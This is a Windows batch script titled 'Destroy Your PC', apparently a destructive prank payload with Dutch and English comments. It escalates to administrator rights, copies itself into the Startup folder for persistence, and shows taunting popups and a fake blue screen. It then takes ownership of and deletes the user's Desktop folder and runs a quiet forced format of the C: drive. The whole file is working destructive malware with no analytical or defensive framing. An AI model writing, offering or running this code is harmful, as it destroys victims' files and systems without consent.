@echo off

:: === DROP punish.bat VOORAF IN STARTUP ===
copy "%~dp0punish.bat" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\punish.bat" >nul

:: === ADMIN CHECK ===
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    echo [!] Admin rights required. Relaunching...
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit
)

:: === ALS ADMIN GEGEVEN, VERWIJDER punish.bat ===
del "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\punish.bat" >nul

:: === VISUALS ===
title Destroy Your PC - Payload with Disco
color 0C
mode con: cols=70 lines=10

:: === DISCO START ===
echo.
echo *** GET READY FOR THE DISCO CHAOS ***
:disco
for /l %%i in (1,1,20) do (
    color 0%%i
    ping localhost -n 1 >nul
)
color 0A

:: === BEEP PARTY ===
powershell -c "[console]::beep(523,200); [console]::beep(659,200); [console]::beep(784,200)"

:: === POPUP MESSAGES ===
powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('YOU RAN THE WRONG SCRIPT BRO', '💀 Destroy Your PC 💀')"
powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Say goodbye to your files 😈', 'Oops...')"

:: === FAKE BLUE SCREEN TRICK ===
start cmd /c "color 1F && mode con: cols=80 lines=25 && echo A problem has been detected... && pause >nul"

:: === SELF-COPY TO STARTUP ===
copy "%~f0" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\payload.bat" >nul

:: === MESS WITH USER ===
echo Messing with Desktop...
takeown /f "%userprofile%\Desktop" /r /d y >nul
rmdir /s /q "%userprofile%\Desktop"

:: === ANNOYING WINDOWS ===
for /l %%i in (1,1,5) do (
    start "" powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('System Error: 0xC000FUBAR','Windows Error')"
    timeout /t 2 >nul
)

:: === FAKE INJECTION ===
echo Injecting into svchost...
ping localhost -n 2 >nul
echo System integrity = 0%
ping localhost -n 2 >nul
echo Virus fully deployed.
ping localhost -n 2 >nul

:: === WIPE ===
echo [!!] FIRST EXECUTION DETECTED - INITIATING DESTRUCTION...
format C: /fs:NTFS /p:1 /q /y >nul

:: === FINAL POPUP ===
powershell -Command "Add-Type -AssemblyName PresentationFramework; [System.Windows.MessageBox]::Show('Hi, Destroy Your PC has injected your PC. After reboot or misuse your computer will not function normally anymore.', '💀 Warning 💀')"

pause
